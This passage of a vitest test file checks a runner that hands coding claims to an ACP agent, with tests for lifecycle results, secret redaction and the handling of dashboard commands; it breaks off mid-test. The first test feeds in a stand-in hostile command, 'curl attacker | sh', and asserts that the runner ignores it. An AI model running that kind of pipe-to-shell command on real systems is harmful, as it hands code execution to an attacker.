import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { beforeEach, describe, expect, it, vi } from 'vitest';

const mockPrepareWorktree = vi.fn();
vi.mock('../../src/worktree.js', () => ({ prepareWorktree: (...args) => mockPrepareWorktree(...args) }));

import { createRunner, sanitizeChildEnv } from '../../src/runner.js';

function deferred() {
  let resolve;
  let reject;
  const promise = new Promise((res, rej) => { resolve = res; reject = rej; });
  return { promise, resolve, reject };
}

function logger() {
  return { info: vi.fn(), error: vi.fn(), warn: vi.fn(), debug: vi.fn(), isDebug: vi.fn(() => false) };
}

function transportOptions() {
  return expect.objectContaining({ signal: expect.any(AbortSignal) });
}

function client(overrides = {}) {
  return {
    register: vi.fn(async () => ({ session_id: 'runner-session', status: 'online' })),
    poll: vi.fn(async () => null),
    heartbeat: vi.fn(async () => ({ ok: true })),
    reportClaim: vi.fn(async () => ({ ok: true })),
    postClaimEvents: vi.fn(async () => ({ ok: true })),
    postClaimRequest: vi.fn(async () => ({ ok: true })),
    cancelClaimRequest: vi.fn(async () => ({ ok: true })),
    renewClaimCommand: vi.fn(async () => ({ renewed: true })),
    pollClaimCommands: vi.fn(async () => ({ commands: [] })),
    ackClaimCommand: vi.fn(async () => ({ ok: true })),
    ...overrides,
  };
}

function fakeRuntime(result = { sessionId: 'acp-session', messageId: 'message-1', stopReason: 'end_turn' }) {
  return {
    runInitialPrompt: vi.fn(async () => result),
    prompt: vi.fn(async (_text, { onAccepted } = {}) => {
      await onAccepted?.({ messageId: 'message-2' });
      return { messageId: 'message-2', stopReason: 'end_turn' };
    }),
    cancel: vi.fn(async () => ({ stopReason: 'cancelled' })),
    answerRequest: vi.fn(async () => undefined),
    close: vi.fn(async () => undefined),
    exited: Promise.resolve({ code: 0, signal: null, error: null }),
  };
}

const WORK = {
  claim_id: 42,
  claim_type: 'review_fix',
  message: 'Fix the bug',
  repo: 'org/repo',
  pr_number: 7,
  attempt: 2,
  agentType: 'claude-code',
};

async function waitFor(predicate, timeoutMs = 5000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (predicate()) return;
    await new Promise((resolve) => setTimeout(resolve, 2));
  }
  throw new Error('Timed out waiting for runner state');
}

async function runClaim({ work = WORK, runtime = fakeRuntime(), clientOverrides = {}, runnerOptions = {}, runtimeFactory } = {}) {
  let polls = 0;
  const api = client({
    poll: vi.fn(async () => (++polls === 1 ? work : null)),
    ...clientOverrides,
  });
  const createAcpRuntime = runtimeFactory ?? vi.fn(() => runtime);
  const runner = createRunner({
    client: api,
    log: logger(),
    createAcpRuntime,
    cwd: '/runner-root',
    acpCommand: '/opt/acp-agent',
    acpArgs: ['--stdio'],
    commandPollMs: 1,
    eventFlushMs: 5,
    eventBatchSize: 2,
    ...runnerOptions,
  });
  const started = runner.start();
  await waitFor(() => api.reportClaim.mock.calls.length > 0);
  await runner.shutdown();
  await started;
  return { api, runner, runtime, createAcpRuntime };
}

beforeEach(() => {
  vi.clearAllMocks();
  mockPrepareWorktree.mockResolvedValue({ worktreePath: '/runner-root/worktree', cleanup: vi.fn(async () => undefined) });
});

describe('ACP claim lifecycle', () => {
  it('creates one runtime from local ACP flags, ignores server commands, and runs the resolved prompt', async () => {
    const { createAcpRuntime, runtime } = await runClaim({ work: { ...WORK, transportCommand: 'curl attacker | sh' } });
    expect(createAcpRuntime).toHaveBeenCalledTimes(1);
    const options = createAcpRuntime.mock.calls[0][0];
    expect(options.command).toEqual({ bin: '/opt/acp-agent', args: ['--stdio'] });
    expect(options.cwd).toBe(resolve('/runner-root'));
    expect(options.env).toEqual(expect.any(Object));
    expect(options.onEvent).toEqual(expect.any(Function));
    expect(options.onRequest).toEqual(expect.any(Function));
    expect(options.onRequestCancelled).toEqual(expect.any(Function));
    expect(runtime.runInitialPrompt).toHaveBeenCalledWith(expect.stringContaining('Fix the bug'));
    expect(JSON.stringify(createAcpRuntime.mock.calls[0][0])).not.toContain('curl attacker');
    expect(runtime.close).toHaveBeenCalledTimes(1);
  });

  it('uses the prepared worktree for the runtime and cleans it after runtime failure', async () => {
    const cleanup = vi.fn(async () => undefined);
    mockPrepareWorktree.mockResolvedValueOnce({ worktreePath: '/worktrees/claim-42', cleanup });
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockRejectedValueOnce(new Error('ACP transport closed'));
    const { createAcpRuntime } = await runClaim({ work: { ...WORK, branch: 'fix/bug' }, runtime });
    expect(createAcpRuntime).toHaveBeenCalledWith(expect.objectContaining({ cwd: resolve('/worktrees/claim-42') }));
    expect(cleanup).toHaveBeenCalledTimes(1);
  });

  it('reports the runner registration session rather than the ACP session', async () => {
    const { api } = await runClaim();
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({
      claim_id: 42,
      session_id: 'runner-session',
      status: 'completed',
    }));
    expect(api.reportClaim.mock.calls[0][0].session_id).not.toBe('acp-session');
  });

  it.each([
    ['end_turn', 'completed', undefined],
    ['error', 'failed', undefined],
    ['refusal', 'failed', undefined],
    ['max_tokens', 'failed', undefined],
    ['max_turn_requests', 'failed', undefined],
    ['unknown_future_reason', 'failed', undefined],
  ])('maps stopReason %s to a terminal %s result', async (stopReason, status, failureKind) => {
    const { api } = await runClaim({ runtime: fakeRuntime({ sessionId: 'acp', messageId: 'm', stopReason }) });
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status }));
    expect(api.reportClaim.mock.calls[0][0].failure_kind).toBe(failureKind);
  });

  it('maps runtime setup, transport, liveness, and recovery errors to transient failure', async () => {
    const runtimeFactory = vi.fn(() => { throw new Error('ACP runtime unavailable'); });
    const { api } = await runClaim({ runtimeFactory });
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'failed', failure_kind: 'transient' }));
  });

  it('does not classify an unsolicited ACP cancelled stop as a dashboard cancellation', async () => {
    const { api } = await runClaim({ runtime: fakeRuntime({ sessionId: 'acp', messageId: 'm', stopReason: 'cancelled' }) });
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'failed', failure_kind: 'transient' }));
  });
  it('advertises verify support during registration', async () => {
    const { api } = await runClaim();
    expect(api.register).toHaveBeenCalledWith(expect.objectContaining({
      supported_claim_types: expect.arrayContaining(['review_fix', 'verify']),
    }));
  });

  it('runs green verification deterministically without starting ACP', async () => {
    const worktreePath = mkdtempSync(join(tmpdir(), 'ff-runner-verify-green-'));
    mockPrepareWorktree.mockResolvedValueOnce({ worktreePath, cleanup: vi.fn(async () => undefined) });
    const work = {
      ...WORK,
      claim_type: 'verify',
      phase: 'green',
      green_sha: '1234567890abcdef1234567890abcdef12345678',
      verification: {
        framework: 'custom',
        command: [process.execPath, '-e', 'process.exit(0)'],
        timeouts_min: { red: 1, green: 1 },
      },
      red_record: {
        framework: 'custom',
        red_base_sha: 'abcdef1234567890abcdef1234567890abcdef12',
      },
    };

    const { api, createAcpRuntime } = await runClaim({ work });

    expect(createAcpRuntime).not.toHaveBeenCalled();
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({
      status: 'completed',
      verification: expect.objectContaining({
        phase: 'green',
        framework: 'custom',
        outcome: 'PASS',
      }),
    }));
  });

});

describe('ACP events and requests', () => {
  it('normalizes raw updates with monotonic sequence, redacts secrets, batches, and flushes before reporting', async () => {
    const order = [];
    const api = client({
      postClaimEvents: vi.fn(async (_session, _claim, events) => { order.push(['events', events]); }),
      reportClaim: vi.fn(async (payload) => { order.push(['report', payload]); }),
    });
    let polls = 0;
    api.poll = vi.fn(async () => (++polls === 1 ? { ...WORK, githubToken: 'gh_secret_value' } : null));
    const runtime = fakeRuntime();
    const createAcpRuntime = vi.fn((options) => {
      runtime.runInitialPrompt.mockImplementationOnce(async () => {
        await options.onEvent({ sessionId: 'acp-session', update: { sessionUpdate: 'agent_message_chunk', messageId: 'message-1', content: { type: 'text', text: 'first gh_secret_' } } });
        await options.onEvent({ sessionId: 'acp-session', update: { sessionUpdate: 'agent_message_chunk', messageId: 'message-1', content: { type: 'text', text: 'value second' } } });
        await options.onEvent({ sessionId: 'acp-session', update: { sessionUpdate: 'terminal_output_chunk', terminalId: 'terminal-1', data: Buffer.from('terminal gh_secret_').toString('base64') } });
        await options.onEvent({ sessionId: 'acp-session', update: { sessionUpdate: 'terminal_output_chunk', terminalId: 'terminal-1', data: Buffer.from('value end').toString('base64') } });
        await options.onEvent({ sessionId: 'acp-session', update: { sessionUpdate: 'state_update', state: 'idle' } });
        return { sessionId: 'acp-session', messageId: 'm', stopReason: 'end_turn' };
      });
      return runtime;
    });
    const runner = createRunner({ client: api, log: logger(), createAcpRuntime, cwd: '/repo', acpCommand: 'agent', eventBatchSize: 2, eventFlushMs: 60_000 });
    const started = runner.start();
    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    await runner.shutdown();
    await started;
    const uploaded = api.postClaimEvents.mock.calls.flatMap((call) => call[2]);
    expect(uploaded.map((event) => event.seq)).toEqual(uploaded.map((_, index) => index + 1));
    const message = uploaded.filter((event) => event.kind === 'agent_message')
      .map((event) => event.payload.raw.content.text).join('');
    const terminal = uploaded.filter((event) => event.kind === 'terminal_output')
      .map((event) => Buffer.from(event.payload.raw.data, 'base64').toString('utf8')).join('');
    expect(message).toBe('first [REDACTED] second');
    expect(terminal).toBe('terminal [REDACTED] end');
    expect(JSON.stringify(uploaded)).not.toContain('gh_secret_value');
    expect(order.at(-1)[0]).toBe('report');
  });

  it('uploads redacted permission and elicitation requests without mutating runtime input', async () => {
    const seen = [];
    const secret = 'runner-token-secret-value';
    const permission = {
      requestKey: 'perm-1',
      kind: 'permission',
      payload: {
        subject: { command: `printf 'Authorization: Bearer ${secret}'` },
        access_token: secret,
        options: ['allow'],
      },
    };
    const runtime = fakeRuntime();
    const { api } = await runClaim({
      runtime,
      runnerOptions: { runnerToken: secret },
      clientOverrides: { postClaimRequest: vi.fn(async (...args) => { seen.push(args); }) },
      runtimeFactory: vi.fn((options) => {
        runtime.runInitialPrompt.mockImplementationOnce(async () => {
          await options.onRequest(permission);
          await options.onRequest({ requestKey: 'form-1', kind: 'elicitation', payload: { fields: ['answer'] } });
          return { sessionId: 'acp', messageId: 'm', stopReason: 'end_turn' };
        });
        return runtime;
      }),
    });
    expect(seen).toEqual([
      ['runner-session', 42, {
        requestKey: 'perm-1',
        kind: 'permission',
        payload: {
          subject: { command: "printf 'Authorization: Bearer [REDACTED]'" },
          access_token: '[REDACTED]',
          options: ['allow'],
        },
      }],
      ['runner-session', 42, { requestKey: 'form-1', kind: 'elicitation', payload: { fields: ['answer'] } }],
    ]);
    expect(permission.payload.subject.command).toContain(secret);
    expect(api.reportClaim).toHaveBeenCalledTimes(1);
  });

  it('persists ACP request cancellation through the current runner claim owner', async () => {
    const order = [];
    const runtime = fakeRuntime();
    const { api } = await runClaim({
      runtime,
      clientOverrides: {
        postClaimRequest: vi.fn(async () => {
          order.push('opened');
        }),
        cancelClaimRequest: vi.fn(async () => {
          order.push('cancelled');
        }),
      },
      runtimeFactory: vi.fn((options) => {
        runtime.runInitialPrompt.mockImplementationOnce(async () => {
          await options.onRequest({ requestKey: 'perm-1', kind: 'permission', payload: {} });
          await options.onRequestCancelled({ requestKey: 'perm-1', kind: 'permission' });
          return { sessionId: 'acp', messageId: 'm', stopReason: 'end_turn' };
        });
        return runtime;
      }),
    });

    expect(order).toEqual(['opened', 'cancelled']);
    expect(api.cancelClaimRequest).toHaveBeenCalledWith('runner-session', 42, 'perm-1');
  });

  it.each([
    ['event upload', 'postClaimEvents'],
    ['request upload', 'postClaimRequest'],
  ])('treats %s failure as transient and never reports completion', async (_label, method) => {
    const runtime = fakeRuntime();
    const runtimeFactory = vi.fn((options) => {
      runtime.runInitialPrompt.mockImplementationOnce(async () => {
        if (method === 'postClaimEvents') await options.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'running' } });
        else await options.onRequest({ requestKey: 'r', kind: 'permission', payload: {} });
        return { sessionId: 'acp', messageId: 'm', stopReason: 'end_turn' };
      });
      return runtime;
    });
    const { api } = await runClaim({ runtime, runtimeFactory, clientOverrides: { [method]: vi.fn(async () => { throw new Error('upload failed'); }) }, runnerOptions: { eventBatchSize: 1 } });
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'failed', failure_kind: 'transient' }));
    expect(api.reportClaim).not.toHaveBeenCalledWith(expect.objectContaining({ status: 'completed' }));
  });

  it('redacts long environment credentials without treating common short boolean values as secrets', async () => {
    const previousBoolean = process.env.TOKENIZERS_PARALLELISM;
    const previousToken = process.env.TEST_PROVIDER_API_TOKEN;
    process.env.TOKENIZERS_PARALLELISM = 'false';
    process.env.TEST_PROVIDER_API_TOKEN = 'provider-token-value-123456789';
    try {
      const runtime = fakeRuntime();
      const { api } = await runClaim({
        runtime,
        runtimeFactory: vi.fn((options) => {
          runtime.runInitialPrompt.mockImplementationOnce(async () => {
            await options.onEvent({
              sessionId: 'acp',
              update: {
                sessionUpdate: 'agent_message_chunk',
                content: { type: 'text', text: 'boolean=false token=provider-token-value-123456789' },
              },
            });
            return { sessionId: 'acp', messageId: 'm', stopReason: 'end_turn' };
          });
          return runtime;
        }),
        runnerOptions: { eventBatchSize: 1 },
      });
      const encoded = JSON.stringify(api.postClaimEvents.mock.calls[0][2]);
      expect(encoded).toContain('boolean=false');
      expect(encoded).not.toContain('provider-token-value-123456789');
      expect(encoded).toContain('[REDACTED]');
    } finally {
      if (previousBoolean === undefined) delete process.env.TOKENIZERS_PARALLELISM;
      else process.env.TOKENIZERS_PARALLELISM = previousBoolean;
      if (previousToken === undefined) delete process.env.TEST_PROVIDER_API_TOKEN;
      else process.env.TEST_PROVIDER_API_TOKEN = previousToken;
    }
  });
});

describe('dashboard commands', () => {
  it.each([
    [{ id: 'c', kind: 'cancel', payload: {} }, 'cancel', []],
    [{ id: 'a', kind: 'permission', request_key: 'perm-1', payload: { answer: { optionId: 'allow' } } }, 'answerRequest', ['perm-1', { optionId: 'allow' }]],
    [{ id: 'e', kind: 'elicitation', request_key: 'form-1', payload: { answer: { values: { name: 'Ada' } } } }, 'answerRequest', ['form-1', { values: { name: 'Ada' } }]],
  ])('dispatches $kind and acknowledges only after local application', async (command, method, args) => {
    const gate = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => gate.promise);
    const commands = vi.fn().mockResolvedValueOnce({ commands: [command] }).mockResolvedValue({ commands: [] });
    const api = client({ pollClaimCommands: commands });
    let workPolls = 0;
    api.poll = vi.fn(async () => (++workPolls === 1 ? WORK : null));
    const runner = createRunner({ client: api, log: logger(), createAcpRuntime: vi.fn(() => runtime), cwd: '/repo', acpCommand: 'agent', commandPollMs: 1 });
    const started = runner.start();
    await waitFor(() => runtime[method].mock.calls.length === 1);
    expect(api.pollClaimCommands).toHaveBeenCalledWith('runner-session', 42, transportOptions());
    expect(runtime[method]).toHaveBeenCalledWith(...args);
    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, command.id, 'acked', expect.anything(), transportOptions());
    gate.resolve({ sessionId: 'acp', messageId: 'm', stopReason: command.kind === 'cancel' ? 'cancelled' : 'end_turn' });
    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    await runner.shutdown();
    await started;
    if (command.kind === 'cancel') expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'cancelled' }));
  });

  it('does not apply an immediate command whose acknowledgement deadline elapsed', async () => {
    const initialTurn = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn()
        .mockResolvedValueOnce({ commands: [{ id: 'expired-cancel', kind: 'cancel', payload: {} }] })
        .mockResolvedValue({ commands: [] }),
      renewClaimCommand: vi.fn(async () => ({ renewed: false })),
    });
    const runner = createRunner({
      client: api,
      log: logger(),
      createAcpRuntime: vi.fn(() => runtime),
      cwd: '/repo',
      acpCommand: 'agent',
      commandPollMs: 1,
    });
    const started = runner.start();
    await waitFor(() => api.renewClaimCommand.mock.calls.length === 1);
    expect(runtime.cancel).not.toHaveBeenCalled();
    expect(api.ackClaimCommand).not.toHaveBeenCalled();
    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    await runner.shutdown();
    await started;
  });

  it('applies a prompt lease that settles with the initial turn', async () => {
    const initialTurn = deferred();
    const leasedCommands = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn()
        .mockImplementationOnce(() => leasedCommands.promise)
        .mockResolvedValue({ commands: [] }),
    });
    const runner = createRunner({ client: api, log: logger(), createAcpRuntime: vi.fn(() => runtime), cwd: '/repo', acpCommand: 'agent', commandPollMs: 50 });
    const started = runner.start();
    await waitFor(() => api.pollClaimCommands.mock.calls.length === 1);
    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
    await new Promise((resolve) => setTimeout(resolve, 0));
    leasedCommands.resolve({ commands: [{ id: 'settling-prompt', kind: 'prompt', payload: { text: 'continue' } }] });
    await waitFor(() => runtime.prompt.mock.calls.length > 0 || api.ackClaimCommand.mock.calls.length > 0);
    expect(runtime.prompt).toHaveBeenCalledWith('continue', { onAccepted: expect.any(Function) });
    expect(api.renewClaimCommand).toHaveBeenCalledWith('runner-session', 42, 'settling-prompt');
    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, 'settling-prompt', 'acked', { applied: true, messageId: 'message-2' }, transportOptions());
    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    await runner.shutdown();
    await started;
  });

  it('queues a prompt during the initial turn without blocking later request answers', async () => {
    const initialTurn = deferred();
    const promptedTurn = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    runtime.prompt.mockImplementationOnce(async (_text, { onAccepted }) => {
      await onAccepted({ messageId: 'prompted' });
      return promptedTurn.promise;
    });
    const commands = [
      { id: 'queued-prompt', kind: 'prompt', payload: { text: 'continue after the turn' } },
      { id: 'permission-answer', kind: 'permission', request_key: 'permission-1', payload: { answer: { optionId: 'allow' } } },
    ];
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn().mockResolvedValueOnce({ commands }).mockResolvedValue({ commands: [] }),
    });
    const runner = createRunner({
      client: api,
      log: logger(),
      createAcpRuntime: vi.fn(() => runtime),
      cwd: '/repo',
      acpCommand: 'agent',
      commandPollMs: 1,
      commandLeaseRenewMs: 5,
    });
    const started = runner.start();
    await waitFor(() => runtime.answerRequest.mock.calls.length === 1);
    expect(runtime.answerRequest).toHaveBeenCalledWith('permission-1', { optionId: 'allow' });
    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, 'permission-answer', 'acked', { applied: true }, transportOptions());
    expect(runtime.prompt).not.toHaveBeenCalled();
    expect(api.ackClaimCommand).not.toHaveBeenCalledWith('runner-session', 42, 'queued-prompt', expect.anything(), expect.anything(), expect.anything());
    await waitFor(() => api.renewClaimCommand.mock.calls.length >= 1);
    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
    await waitFor(() => runtime.prompt.mock.calls.length === 1);
    expect(runtime.prompt).toHaveBeenCalledWith('continue after the turn', { onAccepted: expect.any(Function) });
    await waitFor(() => api.ackClaimCommand.mock.calls.some((call) => call[2] === 'queued-prompt'));
    expect(api.ackClaimCommand).toHaveBeenCalledWith(
      'runner-session',
      42,
      'queued-prompt',
      'acked',
      { applied: true, messageId: 'prompted' },
      transportOptions(),
    );
    promptedTurn.resolve({ messageId: 'prompted', stopReason: 'end_turn' });
    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    await runner.shutdown();
    await started;
  });


  it('keeps a same-batch prompt when an answer drives the current turn idle first', async () => {
    const initialTurn = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    let runtimeOptions;
    runtime.answerRequest.mockImplementationOnce(async () => {
      await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'running' } });
      initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
      await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'idle', stopReason: 'end_turn' } });
    });
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn()
        .mockResolvedValueOnce({
          commands: [
            { id: 'answer-first', kind: 'permission', request_key: 'permission-1', payload: { answer: { optionId: 'allow' } } },
            { id: 'prompt-second', kind: 'prompt', payload: { text: 'continue' } },
          ],
        })
        .mockResolvedValue({ commands: [] }),
    });
    const runner = createRunner({
      client: api,
      log: logger(),
      createAcpRuntime: vi.fn((options) => {
        runtimeOptions = options;
        return runtime;
      }),
      cwd: '/repo',
      acpCommand: 'agent',
      commandPollMs: 1,
    });
    const started = runner.start();
    await waitFor(() => runtime.prompt.mock.calls.length === 1);

    expect(runtime.prompt).toHaveBeenCalledWith('continue', { onAccepted: expect.any(Function) });
    expect(api.ackClaimCommand).toHaveBeenCalledWith(
      'runner-session',
      42,
      'prompt-second',
      'acked',
      { applied: true, messageId: 'message-2' },
      transportOptions(),
    );
    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    await runner.shutdown();
    await started;
  });

  it('does not submit a prompt whose command lease expired before ACP acceptance', async () => {
    const initialTurn = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn()
        .mockResolvedValueOnce({ commands: [{ id: 'expired-prompt', kind: 'prompt', payload: { text: 'too late' } }] })
        .mockResolvedValue({ commands: [] }),
      renewClaimCommand: vi.fn(async () => ({ renewed: false })),
    });
    const runner = createRunner({
      client: api,
      log: logger(),
      createAcpRuntime: vi.fn(() => runtime),
      cwd: '/repo',
      acpCommand: 'agent',
      commandPollMs: 1,
    });
    const started = runner.start();
    await waitFor(() => api.pollClaimCommands.mock.calls.length >= 1);
    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
    await waitFor(() => api.renewClaimCommand.mock.calls.length === 1);
    await waitFor(() => api.reportClaim.mock.calls.length === 1);

    expect(runtime.prompt).not.toHaveBeenCalled();
    expect(api.ackClaimCommand).not.toHaveBeenCalledWith(
      'runner-session',
      42,
      'expired-prompt',
      expect.anything(),
      expect.anything(),
      expect.anything(),
    );
    await runner.shutdown();
    await started;
  });

  it('closes a runtime before awaiting a pending prompt when command polling fails', async () => {
    const initialTurn = deferred();
    const promptedTurn = deferred();
    const secondPoll = deferred();
    const order = [];
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    runtime.prompt.mockImplementationOnce(async (_text, { onAccepted }) => {
      await onAccepted({ messageId: 'prompted' });
      return promptedTurn.promise;
    });
    runtime.close.mockImplementationOnce(async () => {
      order.push('close');
      promptedTurn.reject(new Error('runtime closed'));
    });
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn()
        .mockResolvedValueOnce({ commands: [{ id: 'queued', kind: 'prompt', payload: { text: 'next turn' } }] })
        .mockImplementationOnce(() => secondPoll.promise),
      reportClaim: vi.fn(async () => {
        order.push('report');
        return { ok: true };
      }),
    });
    const runner = createRunner({ client: api, log: logger(), createAcpRuntime: vi.fn(() => runtime), cwd: '/repo', acpCommand: 'agent', commandPollMs: 1 });
    const started = runner.start();
    await waitFor(() => api.pollClaimCommands.mock.calls.length === 2);
    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
    await waitFor(() => runtime.prompt.mock.calls.length === 1);
    secondPoll.reject(new Error('command polling failed'));
    await waitFor(() => runtime.close.mock.calls.length === 1);
    const completion = Promise.race([
      waitFor(() => api.reportClaim.mock.calls.length === 1).then(() => 'reported'),
      new Promise((resolve) => setTimeout(() => resolve('timed-out'), 200)),
    ]);
    await expect(completion).resolves.toBe('reported');
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'failed', failure_kind: 'transient' }));
    expect(order.indexOf('close')).toBeGreaterThanOrEqual(0);
    expect(order.indexOf('report')).toBeGreaterThan(order.indexOf('close'));
    await runner.shutdown();
    await started;
  });

  it('keeps command service alive when an initial idle snapshot precedes active state', async () => {
    const initialTurn = deferred();
    const leased = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn().mockImplementationOnce(() => leased.promise).mockResolvedValue({ commands: [] }),
    });
    let runtimeOptions;
    const runner = createRunner({
      client: api,
      log: logger(),
      createAcpRuntime: vi.fn((options) => {
        runtimeOptions = options;
        return runtime;
      }),
      cwd: '/repo',
      acpCommand: 'agent',
      commandPollMs: 1,
    });
    const started = runner.start();
    await waitFor(() => api.pollClaimCommands.mock.calls.length === 1);
    await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'idle' } });
    leased.resolve({ commands: [
      { id: 'permission-after-snapshot', kind: 'permission', request_key: 'permission-1', payload: { answer: { optionId: 'allow' } } },
    ] });
    await waitFor(() => runtime.answerRequest.mock.calls.length === 1);
    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, 'permission-after-snapshot', 'acked', { applied: true }, transportOptions());
    await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'running' } });
    await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'idle', stopReason: 'end_turn' } });
    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'completed' }));
    await runner.shutdown();
    await started;
  });

  it('fails every command returned after command service shutdown as not applied', async () => {
    const initialTurn = deferred();
    const leased = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn().mockImplementationOnce(() => leased.promise).mockResolvedValue({ commands: [] }),
    });
    let runtimeOptions;
    const createAcpRuntime = vi.fn((options) => {
      runtimeOptions = options;
      return runtime;
    });
    const runner = createRunner({ client: api, log: logger(), createAcpRuntime, cwd: '/repo', acpCommand: 'agent', commandPollMs: 1 });
    const started = runner.start();
    await waitFor(() => api.pollClaimCommands.mock.calls.length === 1);
    await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'running' } });
    await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'idle', stopReason: 'end_turn' } });
    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
    leased.resolve({ commands: [
      { id: 'late-1', kind: 'cancel', payload: {} },
      { id: 'late-2', kind: 'permission', request_key: 'r', payload: { answer: { optionId: 'allow' } } },
    ] });
    await waitFor(() => api.ackClaimCommand.mock.calls.length === 2);
    expect(api.ackClaimCommand.mock.calls).toEqual([
      ['runner-session', 42, 'late-1', 'failed', { error: 'Command was not applied' }, transportOptions()],
      ['runner-session', 42, 'late-2', 'failed', { error: 'Command was not applied' }, transportOptions()],
    ]);
    expect(runtime.cancel).not.toHaveBeenCalled();
    expect(runtime.answerRequest).not.toHaveBeenCalled();
    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    await runner.shutdown();
    await started;
  });

  it('fails the unprocessed remainder of a leased command batch as not applied', async () => {
    const initialTurn = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    runtime.cancel.mockImplementationOnce(async () => {
      initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'cancelled' });
      return { stopReason: 'cancelled' };
    });
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn().mockResolvedValueOnce({ commands: [
        { id: 'cancel-now', kind: 'cancel', payload: {} },
        { id: 'never-prompted', kind: 'prompt', payload: { text: 'must not run' } },
        { id: 'never-answered', kind: 'elicitation', request_key: 'form', payload: { answer: { values: { x: 'y' } } } },
      ] }).mockResolvedValue({ commands: [] }),
    });
    const runner = createRunner({ client: api, log: logger(), createAcpRuntime: vi.fn(() => runtime), cwd: '/repo', acpCommand: 'agent', commandPollMs: 1 });
    const started = runner.start();
    await waitFor(() => api.ackClaimCommand.mock.calls.length === 3);
    expect(api.ackClaimCommand.mock.calls).toEqual([
      ['runner-session', 42, 'cancel-now', 'acked', { applied: true }, transportOptions()],
      ['runner-session', 42, 'never-prompted', 'failed', { error: 'Command was not applied' }, transportOptions()],
      ['runner-session', 42, 'never-answered', 'failed', { error: 'Command was not applied' }, transportOptions()],
    ]);
    expect(runtime.prompt).not.toHaveBeenCalled();
    expect(runtime.answerRequest).not.toHaveBeenCalled();
